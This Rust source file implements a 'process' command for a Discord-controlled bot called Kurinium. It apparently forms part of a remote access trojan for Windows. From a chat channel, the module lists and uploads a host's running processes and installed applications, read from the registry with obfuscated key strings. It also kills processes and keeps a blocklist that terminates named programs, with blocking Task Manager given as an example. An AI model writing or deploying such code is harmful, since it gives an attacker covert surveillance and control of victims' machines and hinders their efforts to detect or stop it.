use crate::commands::Arguments;
use crate::commands::BotCommand;
use crate::core::process::{format_cpu_usage, format_memory_size, ProcessManager};
use crate::installation::get_install_path;
use anyhow::Result;
use async_trait::async_trait;
use std::collections::HashSet;
use std::fs;
use std::sync::Arc;
use twilight_http::Client as HttpClient;
use twilight_model::channel::message::embed::EmbedField;
use twilight_model::channel::message::Message;
use twilight_model::http::attachment::Attachment;
use twilight_util::builder::embed::{EmbedBuilder, EmbedFooterBuilder};

pub struct ProcessCommand;

#[async_trait]
impl BotCommand for ProcessCommand {
    fn name(&self) -> &str { "process" }
    fn description(&self) -> &str { "Manage system processes (list, kill, info, installed)" }
    fn category(&self) -> &str { "system" }
    fn usage(&self) -> &str { ".process <list|kill|info|installed|block|unblock|blocklist> [pid|name]" }
    fn examples(&self) -> &'static [&'static str] { &[".process list", ".process kill 1234", ".process info chrome.exe", ".process block taskmgr", ".process unblock notepad", ".process blocklist"] }
    fn aliases(&self) -> &'static [&'static str] { &["ps", "proc"] }

    async fn execute(
        &self,
        http: &Arc<HttpClient>,
        msg: &Message,
        mut args: Arguments,
    ) -> Result<()> {
        let action = match args.next() {
            Some(action) => action,
            None => {
                let embed = EmbedBuilder::new()
                    .title("Process Management")
                    .description("Manage system processes")
                    .color(0xFF6B6B)
                    .field(EmbedField {
                        name: "Usage".to_string(),
                        value: ".process <list|kill|info> [pid|name]".to_string(),
                        inline: false,
                    })
                    .field(EmbedField {
                        name: "Actions".to_string(),
                        value: "**list** - List all processes\n**kill** - Kill a process by PID\n**info** - Get detailed process info\n**installed** - List all installed applications\n**block** - Block a process from running\n**unblock** - Unblock a process\n**blocklist** - Show blocked processes".to_string(),
                        inline: false,
                    })
                    .footer(EmbedFooterBuilder::new("Kurinium System Commands"))
                    .build();

                http.create_message(msg.channel_id).embeds(&[embed]).await?;
                return Ok(());
            }
        };

        match action {
            "list" => self.list_processes(http, msg).await,
            "installed" => self.list_installed_apps(http, msg).await,
            "kill" => {
                let target = match args.next() {
                    Some(target) => target,
                    None => {
                        http.create_message(msg.channel_id)
                            .content("**Error**: Please provide a PID to kill")
                            .await?;
                        return Ok(());
                    }
                };
                self.kill_process(http, msg, target).await
            }
            "info" => {
                let target = match args.next() {
                    Some(target) => target,
                    None => {
                        http.create_message(msg.channel_id)
                            .content("**Error**: Please provide a PID or process name")
                            .await?;
                        return Ok(());
                    }
                };
                self.process_info(http, msg, target).await
            }
            "block" => {
                let target = match args.next() {
                    Some(target) => target,
                    None => {
                        http.create_message(msg.channel_id)
                            .content("**Error**: Please provide a process name to block")
                            .await?;
                        return Ok(());
                    }
                };
                self.block_process(http, msg, target).await
            }
            "unblock" => {
                let target = match args.next() {
                    Some(target) => target,
                    None => {
                        http.create_message(msg.channel_id)
                            .content("**Error**: Please provide a process name to unblock")
                            .await?;
                        return Ok(());
                    }
                };
                self.unblock_process(http, msg, target).await
            }
            "blocklist" => self.show_blocklist(http, msg).await,
            _ => {
                http.create_message(msg.channel_id)
                    .content(&format!(
                        "**Error**: Unknown action '{}'. Use: list, kill, info, installed, block, unblock, or blocklist",
                        action
                    ))
                    .await?;
                Ok(())
            }
        }
    }
}

impl ProcessCommand {
    async fn list_processes(&self, http: &Arc<HttpClient>, msg: &Message) -> Result<()> {
        let mut manager = ProcessManager::new();
        let processes = manager.list_processes();

        if processes.is_empty() {
            http.create_message(msg.channel_id)
                .content("No processes found")
                .await?;
            return Ok(());
        }

        let total_count = manager.get_system_info().process_count;

        let mut content = String::from("PID      | Name                      | Memory     | Command\n");
        content.push_str(&"=".repeat(90));
        content.push('\n');

        for process in &processes {
            content.push_str(&format!(
                "{:<8} | {:<25} | {:<10} | {}\n",
                process.pid,
                truncate_string(&process.name, 25),
                format_memory_size(process.memory_usage),
                truncate_string(&process.cmdline, 60)
            ));
        }

        let attachment = Attachment::from_bytes(
            "processes.txt".to_string(),
            content.into_bytes(),
            1
        );

        http.create_message(msg.channel_id)
            .content(&format!("**Process List** - {} processes", total_count))
            .attachments(&[attachment])
            .await?;

        Ok(())
    }

    async fn kill_process(
        &self,
        http: &Arc<HttpClient>,
        msg: &Message,
        target: &str,
    ) -> Result<()> {
        let pid = match target.parse::<u32>() {
            Ok(pid) => pid,
            Err(_) => {
                http.create_message(msg.channel_id)
                    .content("**Error**: Please provide a valid PID (numeric value)")
                    .await?;
                return Ok(());
            }
        };

        let mut manager = ProcessManager::new();

        match manager.kill_process(pid) {
            Ok(_) => {
                http.create_message(msg.channel_id)
                    .content(&format!("Process {} terminated successfully", pid))
                    .await?;
            }
            Err(e) => {
                http.create_message(msg.channel_id)
                    .content(&format!("Failed to kill process {}: {}", pid, e))
                    .await?;
            }
        }

        Ok(())
    }

    async fn process_info(
        &self,
        http: &Arc<HttpClient>,
        msg: &Message,
        target: &str,
    ) -> Result<()> {
        let mut manager = ProcessManager::new();

        let processes = if let Ok(pid) = target.parse::<u32>() {
            if let Some(process) = manager.get_process_by_pid(pid) {
                vec![process]
            } else {
                manager.find_processes_by_name(target)
            }
        } else {
            manager.find_processes_by_name(target)
        };

        if processes.is_empty() {
            http.create_message(msg.channel_id)
                .content(&format!("No processes found matching '{}'", target))
                .await?;
            return Ok(());
        }

        let processes: Vec<_> = processes.into_iter().take(3).collect();

        for (i, process) in processes.iter().enumerate() {
            let start_time = chrono::DateTime::from_timestamp(process.start_time as i64, 0)
                .map(|dt| dt.format("%Y-%m-%d %H:%M:%S").to_string())
                .unwrap_or_else(|| "Unknown".to_string());

            let cmdline_display = if process.cmdline.is_empty() {
                "N/A".to_string()
            } else {
                let truncated = truncate_string(&process.cmdline, 200);
                format!("```{}```", truncated)
            };

            let fields = vec![
                EmbedField {
                    name: "PID".to_string(),
                    value: process.pid.to_string(),
                    inline: true,
                },
                EmbedField {
                    name: "Name".to_string(),
                    value: truncate_string(&process.name, 50),
                    inline: true,
                },
                EmbedField {
                    name: "Status".to_string(),
                    value: if process.status.is_empty() { "Running".to_string() } else { process.status.clone() },
                    inline: true,
                },
                EmbedField {
                    name: "Memory".to_string(),
                    value: format_memory_size(process.memory_usage),
                    inline: true,
                },
                EmbedField {
                    name: "CPU".to_string(),
                    value: format_cpu_usage(process.cpu_usage),
                    inline: true,
                },
                EmbedField {
                    name: "Started".to_string(),
                    value: start_time,
                    inline: true,
                },
                EmbedField {
                    name: "Parent PID".to_string(),
                    value: process.parent_pid
                        .map(|p| p.to_string())
                        .unwrap_or_else(|| "N/A".to_string()),
                    inline: true,
                },
                EmbedField {
                    name: "Command Line".to_string(),
                    value: cmdline_display,
                    inline: false,
                },
            ];

            let title = if processes.len() > 1 {
                format!("Process Info {}/{} - {}", i + 1, processes.len(), truncate_string(&process.name, 30))
            } else {
                format!("Process Info - {}", truncate_string(&process.name, 30))
            };

            let mut embed = EmbedBuilder::new()
                .title(title)
                .color(0x45B7D1);

            for field in fields {
                embed = embed.field(field);
            }

            let embed = embed
                .footer(EmbedFooterBuilder::new("Kurinium Process Manager"))
                .build();

            http.create_message(msg.channel_id).embeds(&[embed]).await?;
        }

        Ok(())
    }

    async fn list_installed_apps(&self, http: &Arc<HttpClient>, msg: &Message) -> Result<()> {
        http.create_message(msg.channel_id)
            .content("Getting installed applications...")
            .await?;

        use winreg::enums::*;
        use winreg::RegKey;

        let mut apps = Vec::new();
        
        let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
        if let Ok(uninstall) = hklm.open_subkey(obfstr::obfstr!("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall")) {
            for key_name in uninstall.enum_keys().filter_map(|k| k.ok()) {
                if let Ok(key) = uninstall.open_subkey(&key_name) {
                    let display_name: Result<String, _> = key.get_value("DisplayName");
                    let display_version: Result<String, _> = key.get_value("DisplayVersion");
                    if let Ok(name) = display_name {
                        let version = display_version.unwrap_or_else(|_| "Unknown".to_string());
                        apps.push(format!("{} - {}", name, version));
                    }
                }
            }
        }

        if let Ok(uninstall) = hklm.open_subkey(obfstr::obfstr!("SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall")) {
            for key_name in uninstall.enum_keys().filter_map(|k| k.ok()) {
                if let Ok(key) = uninstall.open_subkey(&key_name) {
                    let display_name: Result<String, _> = key.get_value("DisplayName");
                    let display_version: Result<String, _> = key.get_value("DisplayVersion");
                    if let Ok(name) = display_name {
                        let version = display_version.unwrap_or_else(|_| "Unknown".to_string());
                        let app_info = format!("{} - {}", name, version);
                        if !apps.contains(&app_info) {
                            apps.push(app_info);
                        }
                    }
                }
            }
        }
        
        let hkcu = RegKey::predef(HKEY_CURRENT_USER);
        if let Ok(uninstall) = hkcu.open_subkey(obfstr::obfstr!("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall")) {
            for key_name in uninstall.enum_keys().filter_map(|k| k.ok()) {
                if let Ok(key) = uninstall.open_subkey(&key_name) {
                    let display_name: Result<String, _> = key.get_value("DisplayName");
                    let display_version: Result<String, _> = key.get_value("DisplayVersion");
                    if let Ok(name) = display_name {
                        let version = display_version.unwrap_or_else(|_| "Unknown".to_string());
                        let app_info = format!("{} - {}", name, version);
                        if !apps.contains(&app_info) {
                            apps.push(app_info);
                        }
                    }
                }
            }
        }
        
        apps.sort();
        
        let content = format!(
            "Installed Applications ({})\n{}\n\n{}",
            apps.len(),
            "=".repeat(50),
            apps.join("\n")
        );
        
        let attachment = Attachment::from_bytes(
            "installed_apps.txt".to_string(),
            content.into_bytes(),
            1
        );
        
        http.create_message(msg.channel_id)
            .content(&format!("Found **{}** installed applications", apps.len()))
            .attachments(&[attachment])
            .await?;

        Ok(())
    }

    fn get_blocklist_path() -> std::path::PathBuf {
        get_install_path().join("blocklist.json")
    }

    fn load_blocklist() -> HashSet<String> {
        let path = Self::get_blocklist_path();
        if let Ok(content) = fs::read_to_string(&path) {
            content.lines()
                .filter(|l| !l.is_empty())
                .map(|l| l.to_lowercase())
                .collect()
        } else {
            HashSet::new()
        }
    }

    fn save_blocklist(blocklist: &HashSet<String>) -> Result<()> {
        let path = Self::get_blocklist_path();
        let content = blocklist.iter().cloned().collect::<Vec<_>>().join("\n");
        fs::write(&path, content)?;
        Ok(())
    }

    fn normalize_process_name(name: &str) -> String {
        let name = name.to_lowercase();
        if name.ends_with(".exe") {
            name
        } else {
            format!("{}.exe", name)
        }
    }

    async fn block_process(
        &self,
        http: &Arc<HttpClient>,
        msg: &Message,
        target: &str,
    ) -> Result<()> {
        let process_name = Self::normalize_process_name(target);
        let mut blocklist = Self::load_blocklist();

        if blocklist.contains(&process_name) {
            http.create_message(msg.channel_id)
                .content(&format!("**{}** is already blocked", process_name))
                .await?;
            return Ok(());
        }

        blocklist.insert(process_name.clone());
        if let Err(e) = Self::save_blocklist(&blocklist) {
            http.create_message(msg.channel_id)
                .content(&format!("Error saving blocklist: {}", e))
                .await?;
            return Ok(());
        }

        let mut manager = ProcessManager::new();
        let killed = manager.find_processes_by_name(&process_name);
        let mut kill_count = 0;
        for proc in killed {
            if manager.kill_process(proc.pid).is_ok() {
                kill_count += 1;
            }
        }

        let response = if kill_count > 0 {
            format!("**{}** blocked and {} running instance(s) terminated", process_name, kill_count)
        } else {
            format!("**{}** blocked successfully", process_name)
        };

        http.create_message(msg.channel_id)
            .content(&response)
            .await?;

        Ok(())
    }

    async fn unblock_process(
        &self,
        http: &Arc<HttpClient>,
        msg: &Message,
        target: &str,
    ) -> Result<()> {
        let process_name = Self::normalize_process_name(target);
        let mut blocklist = Self::load_blocklist();

        if !blocklist.remove(&process_name) {
            http.create_message(msg.channel_id)
                .content(&format!("**{}** was not in the blocklist", process_name))
                .await?;
            return Ok(());
        }

        if let Err(e) = Self::save_blocklist(&blocklist) {
            http.create_message(msg.channel_id)
                .content(&format!("Error saving blocklist: {}", e))
                .await?;
            return Ok(());
        }

        http.create_message(msg.channel_id)
            .content(&format!("**{}** unblocked successfully", process_name))
            .await?;

        Ok(())
    }

    async fn show_blocklist(
        &self,
        http: &Arc<HttpClient>,
        msg: &Message,
    ) -> Result<()> {
        let blocklist = Self::load_blocklist();

        if blocklist.is_empty() {
            http.create_message(msg.channel_id)
                .content("No processes are currently blocked")
                .await?;
            return Ok(());
        }

        let mut list: Vec<_> = blocklist.iter().cloned().collect();
        list.sort();
        
        let list_text = list.iter()
            .enumerate()
            .map(|(i, name)| format!("{}. {}", i + 1, name))
            .collect::<Vec<_>>()
            .join("\n");

        let embed = EmbedBuilder::new()
            .title("Blocked Processes")
            .description(format!("**{}** process(es) blocked:\n```\n{}\n```", list.len(), list_text))
            .color(0xE74C3C)
            .footer(EmbedFooterBuilder::new("Use .process unblock <name> to unblock"))
            .build();

        http.create_message(msg.channel_id).embeds(&[embed]).await?;

        Ok(())
    }
}

fn truncate_string(s: &str, max_len: usize) -> String {
    if s.chars().count() <= max_len {
        s.to_string()
    } else {
        let truncated: String = s.chars().take(max_len.saturating_sub(3)).collect();
        format!("{}...", truncated)
    }
}